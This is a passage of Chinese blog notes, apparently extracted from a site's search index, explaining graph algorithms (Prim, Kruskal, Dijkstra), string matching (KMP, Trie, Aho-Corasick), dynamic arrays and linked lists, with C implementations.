*)malloc(sizeof(Graph)); init_Graph(g, n); for (int i = 0; i &lt; m; i++) &#123; int a, b; scanf(\"%d %d\", &amp;a, &amp;b); insert(g, a, b); &#125; floodfill(g); free(g); return 0;&#125; 最小生成树 从一个带权图中抽出一棵生成树，使得边权值和最小，这棵生成树就叫做最小生成树。 Prim 思路很简单，不断寻找距离当前生成树最近的顶点。逐步添加最短边到生成树中。 定义带权图 G 的顶点集合为 V，接着再定义最小生成树的顶点集合为 U，初始集合 U 为空。 任选一个顶点 \\(x\\)，加入集合 \\(U\\)，并记录每个顶点到当前最小生成树的最短距离。 选择一个距离当前最小生成树最近的，且不属于集合 \\(U\\) 的顶点 \\(v\\)（如果有多个顶点 \\(v\\)，任选其一），将顶点 \\(v\\) 加入集合 \\(U\\)，并更新所有与顶点 \\(v\\) 相连的顶点到当前最小生成树的最短距离记录。 3. 重复第二步操作，直至集合 \\(U\\) 等于集合 \\(V\\)。 贪心策略，意味着就很直白，没啥难的。 使用不同的数据结构实现，时间复杂度不同。 EXTRACT-MIN DECREASE-KEY Total array O(V) O(1) \\(O(V^2)\\) binary heap O(log V) O(log V) \\(O(E \\log V)\\) Fibonacci heap O(log V) O(1) \\(O(E + V\\log V)\\) 对于稠密图，E达到 \\(O(V^2)\\) 级别，使用 Fibonacci heap 实现的Prim算法比较合适。 下面的实现，起始有点模糊，抽象了一个 dist 数组。需要到实现过程中才能准确反映出他的意义。一个抽象的解释是，第 i 个节点到当前生成树的最小距离（权值最小的那条边的值）。将生成树看作一个整体的话，dist 数组中的有效值就是与生成树相连的所有边的权值。 通过 dist 数组，找到下一个生成树节点。然后更新加入新节点之后，新的 dist 数组。挺抽象的，但是还好，过程很短。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX_N 1000const int INF = 0x3f3f3f3f;typedef struct Graph &#123; int n; int visited[MAX_N], dist[MAX_N]; int mat[MAX_N][MAX_N];&#125;Graph;void init(Graph *g, int input_n) &#123; g-&gt;n = input_n; for (int i = 0; i &lt; g-&gt;n; i++) &#123; for (int j = 0; j &lt; g-&gt;n; j++) &#123; g-&gt;mat[i][j] = INF; &#125; &#125;&#125;void insert(Graph *g, int x, int y, int weight) &#123; g-&gt;mat[x][y] = weight; g-&gt;mat[y][x] = weight;&#125;int prim(Graph *g, int v) &#123; int total_weight = 0; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;visited[i] = 0; g-&gt;dist[i] = INF; &#125; g-&gt;dist[v] = 0; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; int min_dist = INF, min_vertex; // 贪心搜索下一个生成树节点 for (int j = 0; j &lt; g-&gt;n; ++j) &#123; if (!g-&gt;visited[j] &amp;&amp; g-&gt;dist[j] &lt; min_dist) &#123; min_dist = g-&gt;dist[j]; min_vertex = j; &#125; &#125; total_weight += min_dist; g-&gt;visited[min_vertex] = 1; // 新加入节点后，更新dist数组 for (int j = 0; j &lt; g-&gt;n; ++j) &#123; if (!g-&gt;visited[j] &amp;&amp; g-&gt;mat[min_vertex][j] &lt; g-&gt;dist[j]) &#123; g-&gt;dist[j] = g-&gt;mat[min_vertex][j]; &#125; &#125; &#125; return total_weight;&#125;int main() &#123; int n, m; scanf(\"%d %d\", &amp;n, &amp;m); Graph *g = (Graph *)malloc(sizeof(Graph)); init(g, n); for (int i = 0; i &lt; m; i++) &#123; int a, b, c; scanf(\"%d %d %d\", &amp;a, &amp;b ,&amp;c); insert(g, a, b, c); &#125; printf(\"%d\\n\", prim(g, 0)); free(g); return 0;&#125; 实现中很容易发现，存在很多不必要的遍历，每次遍历都是从 0 到 n，显然存在优化的空间，以后遇到再说。 Kruskal 定义带权图 G 的边集合为 E，接着再定义最小生成树的边集合为 T，初始集合 T 都为空。 首先，把图 \\(G\\) 看成一个有 \\(n\\) 棵树的森林，图上每个顶点对应一棵树。 接着，将边集合 \\(E\\) 的每条边，按权值从小到大进行排序， 依次遍历每条边 \\(e = (u, v)\\)，记顶点 \\(u\\) 所在的树为 \\(T_u\\)，顶点 \\(v\\) 所在的树为 \\(T_v\\)，如果 \\(T_u\\) 和 \\(T_v\\) 不是同一棵树，则将边 \\(e\\) 加入集合 \\(T\\)，并将两棵树 \\(T_u\\) 和 \\(T_v\\) 进行合并。 算法执行完毕后，集合 \\(T\\) 记录了最小生成树的所有边。 贪心策略，每次都会选择一条两个顶点不在同一棵树且权值最小的边加入集合。 算法包括所有边权值排序和遍历所有边合并树。整体时间复杂度主要看排序部分 \\(O(E\\log(E))\\)。所以对于结点多但是边少的稀疏图，性能会比Prim算法好。 实现上，排序使用快速排序，合并验证使用并查集，。 最短路径 求一个起点到其余各个顶点的最短路径问题。 Dijkstra 定义带权图 G 所有顶点的集合为 V，接着再定义已确定最短路径的顶点集合为 U，初始集合 U 为空。 首先将起点 \\(x\\) 加入集合 \\(U\\)，并在数组 \\(A\\) 中记录起点 \\(x\\) 到各个点的最短路径（如果顶点到起点 \\(x\\) 有直接相连的边，则最短路径为边权值，否则为一个极大值）。 从数组 \\(A\\) 中选择一个距离起点 \\(x\\) 最近的，且不属于集合 \\(U\\) 的顶点 \\(v\\)（如果有多个顶点 \\(v\\)，任选其一即可），将顶点 \\(v\\) 加入集合 \\(U\\)，并更新所有与顶点 \\(v\\) 相连的顶点到起点 \\(x\\) 的最短路径。 重复第二步操作，直至集合 \\(U\\) 等于集合 \\(V\\)。 算法结束，数组 \\(A\\) 记录了起点 \\(x\\) 到其余 \\(n - 1\\) 个点的最短路径。 和Prim很类似，差别在于比较大小的目标是距离起点 x 的距离。同时算法不能处理有负权边的问题（这是Bellman Ford这类算法解决的问题）。 时间复杂度和Prim类似，在是使用 Fibonacci heap 优化后，为\\(O(E + V\\log V)\\)。 算法的关键就是更新当前最优结点的相邻结点的最短路径。（真的不喜欢贪心这个词，每次找到最值怎么就贪心了？贪心是已经得到最好，但是还是不满足的。） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX_N 1000const int INF = 0x3f3f3f3f;typedef struct Graph &#123; int n; int visited[MAX_N], dist[MAX_N]; int mat[MAX_N][MAX_N];&#125;Graph;void init(Graph *g, int input_n) &#123; g-&gt;n = input_n; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; for (int j = 0; j &lt; g-&gt;n; j++) &#123; g-&gt;mat[i][j] = INF; &#125; &#125;&#125;void insert(Graph *g, int x, int y, int weight) &#123; g-&gt;mat[x][y] = weight; g-&gt;mat[y][x] = weight;&#125;void dijkstra(Graph *g, int v) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;visited[i] = 0; g-&gt;dist[i] = INF; &#125; g-&gt;dist[v] = 0; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; int min_d = INF, min_i; // i结点当前到起点的最短路径 for (int j = 0; j &lt; g-&gt;n; ++j) &#123; if (!g-&gt;visited[j] &amp;&amp; g-&gt;dist[j] &lt; min_d) &#123; min_d = g-&gt;dist[j]; min_i = j; &#125; &#125; g-&gt;visited[min_i] = 1; // 从已知最短路径的结点开始，计算相邻结点到起点的最短路径是否需要更新 for (int k = 0; k &lt; g-&gt;n; k++) &#123; if (!g-&gt;visited[k] &amp;&amp; g-&gt;mat[min_i][k] + min_d &lt; g-&gt;dist[k]) &#123; g-&gt;dist[k] = g-&gt;mat[min_i][k] + min_d; &#125; &#125; &#125;&#125;int main() &#123; int n, m; scanf(\"%d %d\", &amp;n, &amp;m); Graph *g = (Graph *)malloc(sizeof(Graph)); init(g, n); for (int i = 0; i &lt; m; i++) &#123; int a, b, c; scanf(\"%d %d %d\", &amp;a, &amp;b ,&amp;c); insert(g, a, b, c); &#125; int v; scanf(\"%d\", &amp;v); dijkstra(g, v); for (int i = 0; i &lt; n; i++) &#123; printf(\"%d: %d\\n\", i, g-&gt;dist[i]); &#125; free(g); return 0;&#125; 字符串匹配 这部分之前整理过，字符串匹配从KMP到AC自动机。但是这个东西就是容易忘。 基础的暴力搜索方法就不谈了，没啥可记的。 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAXLEN 1024int match(char *buffer, char *pattern) &#123; for (int i = 0; i &lt; strlen(buffer) - strlen(pattern) + 1; ++i) &#123; int j = 0; for (; j &lt; strlen(pattern); ++j) &#123; if (buffer[i + j] != pattern[j]) &#123; break; &#125; &#125; if (j == strlen(pattern)) &#123; return i; &#125; &#125; return -1;&#125;int main() &#123; char buffer[MAXLEN], pattern[MAXLEN]; scanf(\"%s%s\", buffer, pattern); int location = match(buffer, pattern); if (location != -1) &#123; printf(\"match success, location is %d\\n\", location); &#125; else &#123; printf(\"match failed!\\n\"); &#125; return 0;&#125; 注意 i &lt; strlen(buffer) - strlen(pattern) + 1，其中 + 1 才表示最后一段 pattern 长度的字符的起点index。 KMP 12S: aaaaaababaaaaaW: ababc 上例，abab匹配，c不匹配。暴力搜索会直接退回4个位置，从S中a的下一个b开始重新匹配W。 KMP的思想就是，不回退4，而是利用已经匹配过的字符，找到可以直接跳过，并且一定和W的一部分匹配的位置。比如上例中，第一次abab匹配，c不匹配，那么此时，根据W的规律，S中必然出现了abab。此时可以跳过S中a之后的第一个b，从第二个ab之后的位置开始匹配W的第一个ab之后的部分。 KMP就是分析W的规律，找到当每一个位置字符出现不匹配时，下一次匹配可以高效跳过的部分。 建立一个 Next 数组，记录在 W 中，拥有相同前缀的子串中最后一个字符的index值。就是下一次匹配开始的位置。注意其中一个子串是从 W 的第一个字符开始的，另一个字串位于 W 中间部分。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAX_LEN 100010void get_next(char *pat, int *next) &#123; next[0] = 0; for (int i = 1, j = 0; i &lt; strlen(pat); ++i) &#123; // j - 1 代表已经成功匹配的最后一个位置的index，j为待匹配的第一个位置 while (j &amp;&amp; pat[j] != pat[i]) &#123; j = next[j - 1]; &#125; if (pat[j] == pat[i]) &#123; j++; &#125; next[i] = j; &#125;&#125;int find(char *buffer, char *pat, int *next) &#123; // j 代表j - 1 及之前的部分已经匹配，匹配成功会等于 pat 的长度 for (int i = 0, j = 0; i &lt; strlen(buffer); ++i) &#123; while (j &amp;&amp; pat[j] != buffer[i]) &#123; j = next[j - 1]; &#125; if (pat[j] == buffer[i]) &#123; j++; &#125; if (j == strlen(pat)) &#123; return i - j + 1; &#125; &#125; return -1;&#125;int main() &#123; char buffer[MAX_LEN], pattern[MAX_LEN]; int next[MAX_LEN]; scanf(\"%s%s\", buffer, pattern); get_next(pattern, next); int location = find(buffer, pattern, next); if (location == -1) &#123; printf(\"No\\n\"); &#125; else &#123; printf(\"Yes\\n%d\\n\", location); &#125; return 0;&#125; Trie 多个模式字符串前缀树，处理一个输入串从多个模式字符串中进行匹配前缀的情况。 Trie 树有以下特点： Trie 树的根结点上不存储字符，其余结点上存且只存一个字符。 从根结点出发，到某一结点上经过的字符，即是该结点对应的前缀。 每个结点的孩子结点存储的字符各不相同。 Trie 树牺牲空间来换取时间，当数据量很大时，会占用很大空间。如果字符串均由小写字母组成，则每个结点最多会有 \\(26\\) 个孩子结点，则最多会有 \\(26^n\\) 个用于存储的结点，\\(n\\) 为字符串的最大长度。 Trie 树常用于字符串的快速检索，字符串的快速排序与去重，文本的词频统计等。查询效率对于长度为 n 的输入串，时间复杂为 O(n)。 下面程序利用Trie计算一段输入串 S 中不重复的字串个数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;const int N = 100010;const int SIZE = 26;const char BASE = 'a';typedef struct TrieNode &#123; int is_terminal; struct TrieNode **childs; // 26个字母&#125; TrieNode, *Trie;TrieNode* new_node() &#123; Trie p = (Trie)malloc(sizeof(TrieNode)); p-&gt;childs = (Trie *)malloc(sizeof(Trie) *SIZE); for (int i = 0; i &lt; SIZE; i++) &#123; p-&gt;childs[i] = NULL; &#125; p-&gt;is_terminal = 0; return p;&#125;void clear(Trie t) &#123; if (t) &#123; for (int i = 0; i &lt; SIZE; ++i) &#123; if (t-&gt;childs[i]) &#123; clear(t-&gt;childs[i]); &#125; &#125; free(t-&gt;childs); free(t); &#125;&#125;// 增肌一个参数 res，累计一段字符串中不同字串的个数。void insert(Trie trie, char *pattern, int *res) &#123; TrieNode *p = trie; for (int i = 0; i &lt; strlen(pattern); ++i) &#123; if (p-&gt;childs[pattern[i] - BASE] == NULL) &#123; p-&gt;childs[pattern[i] - BASE] = new_node(); (*res)++; &#125; p = p-&gt;childs[pattern[i] - BASE]; &#125; p-&gt;is_terminal = 1;&#125;int find(Trie trie, char *buffer) &#123; TrieNode *p = trie; for (int i = 0; i &lt; strlen(buffer); i++) &#123; if (p-&gt;childs[buffer[i] - BASE] == NULL) &#123; return 0; &#125; p = p-&gt;childs[buffer[i] - BASE]; &#125; return p-&gt;is_terminal;&#125;int main() &#123; char s[100005]; scanf(\"%s\", s); // 计算累计一段字符串中不同字串的个数。 int res = 0; Trie root = new_node(); for (int i = 0; i &lt; strlen(s); ++i) &#123; insert(root, s + i, &amp;res); &#125; printf(\"%d\", res); clear(root); return 0;&#125; AC自动机 处理多个模式串，在一个输入串 S 中搜索出现的模式串的问题。 AC自动机约等于Trie + KMP，加速多pattern匹配过程。 构建 patterns 的 Trie 构建 fail 指针 开始匹配 构建 fail 指针 在Trie中，BFS遍历，第一层，fail指针都指向 root 第一层之后，每个节点的 fail 指针，指向 【该节点的父节点】 的 【fail指针指向的节点】 的 【儿子节点】中 【和该节点（自己）同字符的节点】。如果没有找到，【fail指针指向的节点】继续向上找 fail 节点，直到 root。 fail指针表示的是以当前字符作为开头的最长后缀所在的位置。 匹配过程 输入string s，trie从 root开始，进行匹配 当匹配失败，跳转到fail指针指向的节点，如果fail到 root，输入此位置之后的string s的部分，继续查找。 当匹配成功（Trie标记的节点），也跳转到fail指针指向的节点，如果此时跳转到 root，进行回溯到前一个最长的trie路径节点。 下面的程序，输入一个字符串，输出输入串中出现多少个已知pattern。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;const int SIZE = 26;const char BASE = 'a';const int MAX_SIZE = 20005;const int MAX_LEN = 25;typedef struct TrieNode &#123; int count; struct TrieNode** childs; struct TrieNode* fail;&#125; TrieNode, *Trie;TrieNode* new_node() &#123; TrieNode *p = (TrieNode *)malloc(sizeof(TrieNode)); p-&gt;childs = (TrieNode **)malloc(sizeof(TrieNode *) * SIZE); for (int i = 0; i &lt; SIZE; i++) &#123; p-&gt;childs[i] = NULL; &#125; p-&gt;fail = NULL; p-&gt;count = 0; return p;&#125;void clear(TrieNode *p) &#123; if (p != NULL) &#123; for (int i = 0; i &lt; SIZE; i++) &#123; if (p-&gt;childs[i] != NULL) &#123; clear(p-&gt;childs[i]); &#125; &#125; free(p-&gt;childs); free(p); &#125;&#125;// 构建Trie，并记录每个pattern出现次数，保存在每个node的count属性中void insert(Trie trie, char *buffer) &#123; TrieNode *p = trie; for (int i = 0; i &lt; strlen(buffer); i++) &#123; if (p-&gt;childs[buffer[i] - BASE] == NULL) &#123; p-&gt;childs[buffer[i] - BASE] = new_node(); &#125; p = p-&gt;childs[buffer[i] - BASE]; &#125; p-&gt;count++;&#125;// 构建fail指针void build_automaton(Trie root) &#123; root-&gt;fail = root; TrieNode *q[MAX_SIZE]; // 这里的BFS使用数组模拟queue int l = 0, r = 0; q[r++] = root; // BFS while (l &lt; r) &#123; TrieNode *now = q[l++]; for (int i = 0; i &lt; SIZE; ++i) &#123; if (now-&gt;childs[i] != NULL) &#123; TrieNode *child = now-&gt;childs[i]; if (now == root) &#123; // root指向自己 child-&gt;fail = root; &#125; else &#123; TrieNode *iter = now; // 找到fail指针中相同字符 while (iter != root &amp;&amp; iter-&gt;fail-&gt;childs[i] == NULL) &#123; iter = iter-&gt;fail; &#125; // 检查是否可以从fail指针的child开始向下匹配 if (iter-&gt;fail-&gt;childs[i] != NULL) &#123; child-&gt;fail = iter-&gt;fail-&gt;childs[i]; &#125; else &#123; child-&gt;fail = root; &#125; &#125; // BFS 每一层node q[r++] = child; &#125; &#125; &#125;&#125;int match_count(Trie root, const char *buffer) &#123; TrieNode *p = root; int total_count = 0; for (int i = 0; buffer[i]; ++i) &#123; // pattern不匹配，向fail指针回溯 while (p != root &amp;&amp; p-&gt;childs[buffer[i] - BASE] == NULL) &#123; p = p-&gt;fail; &#125; p = p-&gt;childs[buffer[i] - BASE]; if (p == NULL) &#123; p = root; &#125; // 累加匹配成功的Trie树路径上，有效pattern的数量，因为回溯停止时，停在最大匹配处 TrieNode *iter = p; while (iter != root) &#123; total_count += iter-&gt;count; iter = iter-&gt;fail; &#125; &#125; return total_count;&#125;int main() &#123; Trie root = new_node(); int n; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; ++i) &#123; char pattern[MAX_LEN]; scanf(\"%s\", pattern); insert(root, pattern); &#125; build_automaton(root); char str_buffer[100005]; scanf(\"%s\", str_buffer); printf(\"%d\\n\", match_count(root, str_buffer)); clear(root); return 0;&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Data Structure","slug":"Notes/Data-Structure","permalink":"https://racleray.github.io/categories/Notes/Data-Structure/"}],"tags":[{"name":"data structure","slug":"data-structure","permalink":"https://racleray.github.io/tags/data-structure/"},{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"}],"author":"HeRui"},{"title":"数据结构整理-part1","slug":"数据结构整理-part1","date":"2021-10-03T13:30:33.000Z","updated":"2023-08-07T11:54:31.042Z","comments":true,"path":"posts/d828af60.html","link":"","permalink":"https://racleray.github.io/posts/d828af60.html","excerpt":"常见基本数据结构整理，使用C语言编写。","text":"导论 数据结构 是计算机存储、组织数据的方式，是指数据元素的集合以及数据元素之间存在的一种或者多种关系的集合 元素之间的关系包括数据的逻辑结构、数据的存储结构和数据的运算结构。 数据 是信息的载体，是可以被计算机识别存储并加工处理的描述客观事物的信息符号的总称。 数据元素 是数据的基本单位，在计算机程序中通常作为一个整体考虑。一个数据元素由若干个 数据项 组成。 数据项是数据结构中讨论的最小单位。有两类数据元素：如果数据元素不能再分，则称为 原子项 ；如果数据元素由若干个数据项组成，则称为 组合项 。 数据结构是一门研究非数值计算的学科，主要研究数据元素以及它们之间的关系和运算等，而且确保经过这些运算后所得到的新结构仍然是原来的结构类型。 数据结构有两个要素，一个是数据元素的集合，另一个是关系的集合。 集合结构。数据元素属于同一个集合。 线性结构。数据元素之间存在着一对一的关系。常见的有链表、队列、栈等。 树形结构。数据元素之间存在着一对多的关系。常见的有二叉树、二叉查找树、平衡二叉查找树等。 图形结构。数据元素之间存在着多对多的关系。 按照存储方式的不同，数据结构可以分为顺序存储结构和链式存储结构： 顺序存储结构，表示数据元素在存储器中是连续存储的，可以用相对位置来表示数据元素之间的逻辑结构，如顺序表、队列、栈等。 链式存储结构，每个数据元素里设置了一个指针用来指向另一个元素的存储地址，以此来表示数据元素之间的逻辑结构。 按照逻辑结构来分，数据结构可以分为线性结构和非线性结构 如果数据元素之间存在一对一的关系，则称为线性结构 否则称为非线性结构。集合结构、树形结构、图形结构都称为非线性结构。 算法（Algorithm）是对某一个或者某一类问题的解决方案的描述，根据问题的输入，在有限的计算时间里输出预期的结果。 算法有以下 5 个特征： 有穷性。算法必须在执行有限个操作后终止。 确切性。算法的每一个操作必须有明确的定义。 输入项。算法有零个或多个输入，描述算法的初始状态。 输出项。算法有一个或多个输出，没有输出的算法我们认为是没有意义的。 可行性。算法的每个计算操作都可以在有限时间内完成。 数据结构描述了数据元素之间的逻辑关系，算法描述了数据元素的操作步骤，数据结构和算法组成了程序世界。数据结构和算法之间是不可分割的关系，数据结构是程序的基础，算法将数据互相联系起来，形成了一套能解决具体问题的方案。 在解决问题时，一般我们会优先确定数据结构，然后再来完善算法，有时也会反过来，根据算法来选择合适的数据结构。选择一个合适的数据结构，可以降低算法的复杂度，提高算法的效率。 复杂度分析 时间复杂度 时间频度是指算法中语句的执行次数，用 T(n) 来表示， n 为问题的规模。 时间频度的表达方法有点复杂，我们需要更直观的表达方法，于是引入了时间复杂度的概念。 函数 f(n)，在 n 趋向于无穷大时， T(n)/f(n) 的极限值为不等于 0 的常数，则我们近似的将 f(n) 替代 T(n)，记为 T(n)=O(f(n))，称为算法的渐进时间复杂度。 时间复杂度只关心算法中最耗时的部分 常见复杂度级别 空间复杂度 空间复杂度是指运行该算法所占用的存储空间大小，记为 S(n) 预估出算法运行所需的存储空间，包括指令空间、数据空间、动态申请的内存空间等。 12345int *a = new int[n];int **b = new int*[n];for (int i = 0; i &lt; n; i++) &#123; b[i] = new int[n];&#125; S(n)=n+n^2，则空间复杂度为 O(n^2)。 内容 数据结构I 包含了一些基础的数据结构，一共分为三部分： 线性结构，包括顺序表、链表、队列、栈等； 树结构和图结构的入门，包括二叉树、图的存储方式等； 查找排序算法，包括哈希表、顺序查找、折半查找、三分查找等查找算法，和插入排序、冒泡排序、归并排序、选择排序和快速排序等排序算法。 数据结构II 包含了一些进阶的数据结构，一共分为两部分： 树结构，包括二叉查找树、平衡二叉查找树、堆与优先队列、森林与并查集等； 图结构，包括图的遍历、图的连通性、最短路和最小生成树等算法。 线性表 线性表是由 相同数据类型 的 n 个数据元素组成的有限序列。 线性表按照存储结构，可以分为顺序表和链表两种类型。 顺序表 实现顺序表的构造、插入、扩容、查找、删除、遍历这 6 种基本操作，并在本章最后用顺序表这个数据结构求解一道题目 顺序表是线性表的一种顺序存储形式。换句话说，线性表是逻辑结构，表示元素之间一对一的相邻关系；而顺序表是存储结构，是指用一组地址连续的存储单元，依次存储线性表中的数据元素，从而使得逻辑上相邻的两个元素在物理位置上也相邻。 顺序表在程序中通常用一维数组实现，一维数组可以是静态分配的，也可以是动态分配的。 在静态分配时，由于数组的大小和空间是固定的 在动态分配时，存储数组的空间在程序执行过程中会动态调整大小 支持随机访问 插入和删除操作需要移动大量的元素，从而保持逻辑上和物理上的连续性。 堆里数组，同时使用一段连续地址，储存相同类型的有限数据序列。 implement 实现一 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Vector &#123; int size, length; int *data;&#125; Vector;void init(Vector *vector, int size) &#123; vector-&gt;size = size; vector-&gt;length = 0; vector-&gt;data = (int *)malloc(sizeof(int) * size);&#125;// 请在下面实现扩容函数 expandvoid expand(Vector *vector) &#123; int *old_data = vector-&gt;data; vector-&gt;size = vector-&gt;size * 2; vector-&gt;data = (int *)malloc(sizeof(int) * vector-&gt;size); for (int i = 0; i &lt; vector-&gt;length; ++i) &#123; vector-&gt;data[i] = old_data[i]; &#125; free(old_data);&#125;int insert(Vector *vector, int loc, int value) &#123; if (loc &lt; 0 || loc &gt; vector-&gt;length) &#123; return ERROR; &#125; if (vector-&gt;length &gt;= vector-&gt;size) &#123; // return ERROR; expand(vector); &#125; for (int i = vector-&gt;length; i &gt; loc; --i) &#123; vector-&gt;data[i] = vector-&gt;data[i - 1]; &#125; vector-&gt;data[loc] = value; vector-&gt;length++; return OK;&#125;int search(Vector *vector, int value) &#123; for (int i = 0; i &lt; vector-&gt;length; ++i) &#123; if (vector-&gt;data[i] == value) &#123; return i; &#125; &#125; return -1;&#125;int delete_node(Vector *vector, int index) &#123; if (index &lt; 0 || index &gt;= vector-&gt;length) &#123; return ERROR; &#125; for (int i = index + 1; i &lt; vector-&gt;length; ++i) &#123; vector-&gt;data[i - 1] = vector-&gt;data[i]; &#125; vector-&gt;length--; return OK;&#125;void print(Vector *vector) &#123; for (int i = 0; i &lt; vector-&gt;length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", vector-&gt;data[i]); &#125; printf(\"\\n\");&#125;void clear(Vector *vector) &#123; free(vector-&gt;data); free(vector);&#125;int main() &#123; Vector *a = (Vector *)malloc(sizeof(Vector)); init(a, 100); printf(\"%d\\n\", insert(a, 1, 0)); printf(\"%d\\n\", insert(a, 0, 1)); printf(\"%d\\n\", insert(a, 2, 1)); printf(\"%d\\n\", insert(a, 1, 2)); printf(\"%d\\n\", insert(a, 0, 3)); clear(a); return 0;&#125; 实现二 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define ERROR 0#define OK 1/*错误处理还不严谨，使用mem操作，比上一个for循环高效*/typedef struct Vector &#123; int s, l; int *d;&#125; Vector;void init(Vector *v, int size) &#123; if (!v) return; v-&gt;s = size; v-&gt;l = 0; v-&gt;d = (int *)malloc(size * sizeof(int));&#125;int expand(Vector *v) &#123; if (!v) return ERROR; int expandsize = v-&gt;s; int *tmp = NULL; while (expandsize) &#123; // realloc, append v-&gt;d. If necessary, copy to a bigger memory block. tmp = (int *)realloc(v-&gt;d, sizeof(int) * (v-&gt;s + expandsize)); if (tmp) break; expandsize &gt;&gt;= 2; &#125; if (!tmp) return ERROR; v-&gt;d = tmp; v-&gt;s += expandsize; // printf(\"Expand succeed\"); return OK;&#125;int insert(Vector *v, int loc, int value) &#123; if (!v) return ERROR; if (loc &lt; 0 || loc &gt; v-&gt;l) return ERROR; if (v-&gt;s &lt;= v-&gt;l) &#123; if (!expand(v)) return ERROR; &#125; memcpy(v-&gt;d + loc + 1, v-&gt;d + loc, sizeof(int) * (v-&gt;l - loc)); v-&gt;d[loc] = value; v-&gt;l++; return OK;&#125;int search(Vector *v, int target) &#123; if (!v) return ERROR; for (int i = 0; i &lt; v-&gt;l; ++i) &#123; if (*(v-&gt;d + i) == target) return i + 1; // return index begin from 1 &#125; return ERROR;&#125;int delete_node(Vector *v, int loc) &#123; if (!v) return ERROR; if (loc &lt; 0 || loc &gt;= v-&gt;l) return ERROR; memcpy(v-&gt;d + loc, v-&gt;d + loc + 1, sizeof(int) * (v-&gt;l - loc - 1)); v-&gt;l--; return OK;&#125;void print(Vector *v) &#123; int *tmp = v-&gt;d; int i = 0; while (i &lt; v-&gt;l) &#123; (i &gt; 0) &amp;&amp; printf(\" \"); printf(\"%d\", *tmp); ++i; ++tmp; &#125; printf(\"\\n\");&#125;void clear(Vector *v) &#123; free(v-&gt;d); free(v);&#125;int main() &#123; Vector *v = (Vector *)malloc(sizeof(Vector)); init(v, 20); // random test: use #include &lt;time.h&gt; srand(time(NULL)); op = rand() % 4; ... int n, op, loc, val; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;op); switch (op) &#123; case 1: scanf(\"%d%d\", &amp;loc, &amp;val); if (insert(v, loc, val)) printf(\"success\\n\"); else printf(\"failed\\n\"); break; case 2: scanf(\"%d\", &amp;loc); if (delete_node(v, loc)) printf(\"success\\n\"); else printf(\"failed\\n\"); break; case 3: scanf(\"%d\", &amp;val); if (search(v, val)) printf(\"success\\n\"); else printf(\"failed\\n\"); break; case 4: print(v); break; &#125; &#125; clear(v); return 0;&#125; 链表 implement 注意没有单独定义 linked list 结构体，没有记录长度。 示例用代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node&#123; int data; struct Node *next;&#125;Node, *LinkedList;LinkedList insert(LinkedList head, Node *node, int index) &#123; if (head == NULL) &#123; if (index != 0) &#123; return head; &#125; head = node; return head; &#125; if (index == 0) &#123; node-&gt;next = head; head = node; return head; &#125; Node *current_node = head; int count = 0; while (current_node-&gt;next != NULL &amp;&amp; count &lt; index - 1) &#123; current_node = current_node-&gt;next; count++; &#125; if (count == index - 1) &#123; node-&gt;next = current_node-&gt;next; current_node-&gt;next = node; &#125; return head;&#125;void output(LinkedList head) &#123; if (head == NULL) &#123; return; &#125; Node *current_node = head; while (current_node != NULL) &#123; printf(\"%d \", current_node-&gt;data); current_node = current_node-&gt;next; &#125; printf(\"\\n\");&#125;LinkedList delete_node(LinkedList head, int index) &#123; if (head == NULL) &#123; return head; &#125; Node *current_node = head; int count = 0; if (index == 0) &#123; head = head-&gt;next; free(current_node); return head; &#125; // count &lt; index - 1: index 比 链表长度 大很多，count == index - 1 不会成立，这里就是要保证找到目标位置时，count == index - 1 成立 while (current_node-&gt;next != NULL &amp;&amp; count &lt; index - 1) &#123; current_node = current_node-&gt;next; count++; &#125; // 停在要删除位置前一个，current_node-&gt;next != NULL 应该恒成立 if (count == index - 1 &amp;&amp; current_node-&gt;next != NULL) &#123; Node *delete_node = current_node-&gt;next; current_node-&gt;next = delete_node-&gt;next; free(delete_node); &#125; return head;&#125;LinkedList reverse(LinkedList head) &#123; if (head == NULL) &#123; return head; &#125; Node *next_node, *current_node; current_node = head-&gt;next; head-&gt;next = NULL; while (current_node != NULL) &#123; next_node = current_node-&gt;next; current_node-&gt;next = head; head = current_node; current_node = next_node; &#125; return head;&#125;void clear(LinkedList head) &#123; Node *current_node = head; while (current_node != NULL) &#123; Node *delete_node = current_node; current_node = current_node-&gt;next; free(delete_node); 